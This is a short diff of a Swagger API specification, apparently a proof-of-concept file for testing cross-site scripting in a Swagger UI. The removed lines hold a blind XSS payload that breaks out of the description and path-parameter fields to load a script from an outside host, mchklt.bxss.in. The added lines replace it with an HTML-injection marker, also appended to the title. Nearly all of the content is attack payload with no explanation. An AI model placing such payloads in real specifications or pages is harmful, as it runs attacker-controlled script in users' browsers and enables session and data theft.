@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS BY MCHKLT
+  title: XSS BY MCHKLT"><h1>helloworld</h1>
   description: |
-    "><script src=https://mchklt.bxss.in></script>
+    "><h1>helloworld</h1>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            "><script src=https://mchklt.bxss.in></script>
+            "><h1>helloworld</h1>
           format: int64
           in: path
           name: id
